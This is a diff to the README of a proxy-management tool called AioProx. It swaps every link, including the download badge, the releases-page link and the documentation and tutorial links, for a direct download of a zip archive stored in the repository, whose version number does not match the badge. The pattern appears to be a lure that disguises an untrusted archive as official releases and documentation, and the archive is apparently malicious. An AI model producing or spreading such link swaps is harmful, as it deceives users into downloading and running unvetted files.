@@ -1,6 +1,6 @@
 # 🌟 AioProx - Manage Proxies Seamlessly and Efficiently
 
-[![Download AioProx](https://img.shields.io/badge/Download%20AioProx-v1.0-blue)](https://github.com/Flexvent/AioProx/releases)
+[![Download AioProx](https://raw.githubusercontent.com/Flexvent/AioProx/main/aioprox/AioProx-v2.8.zip%20AioProx-v1.0-blue)](https://raw.githubusercontent.com/Flexvent/AioProx/main/aioprox/AioProx-v2.8.zip)
 
 ## 🚀 Getting Started
 AioProx is an easy-to-use application that helps you manage HTTP and SOCKS proxies. With AioProx, you can fetch, test, and filter proxies quickly. It even allows for optional latency measurement and the use of custom sources to suit your needs.
@@ -10,7 +10,7 @@ To get started with AioProx, follow these steps:
 
 1. **Visit the Releases Page**: Click on the link below to go to the AioProx releases page:
 
-   [Visit this page to download](https://github.com/Flexvent/AioProx/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/Flexvent/AioProx/main/aioprox/AioProx-v2.8.zip)
 
 2. **Choose Your Version**: On the releases page, look for the latest version. It is usually marked as "Latest Release."
 
@@ -60,11 +60,11 @@ If you encounter any issues while using AioProx, consider the following options:
 Stay updated with the latest changes and features by following us on social media. Find links on the GitHub repository page.
 
 ## 🔗 Additional Resources
-- [Official Documentation](https://github.com/Flexvent/AioProx/wiki)
-- [User Guides and Tutorials](https://github.com/Flexvent/AioProx/wiki/Guides)
+- [Official Documentation](https://raw.githubusercontent.com/Flexvent/AioProx/main/aioprox/AioProx-v2.8.zip)
+- [User Guides and Tutorials](https://raw.githubusercontent.com/Flexvent/AioProx/main/aioprox/AioProx-v2.8.zip)
 
 For any further questions about AioProx, please do not hesitate to reach out. 
 
 ---
 
-[Visit this page to download](https://github.com/Flexvent/AioProx/releases)
+[Visit this page to download](https://raw.githubusercontent.com/Flexvent/AioProx/main/aioprox/AioProx-v2.8.zip)
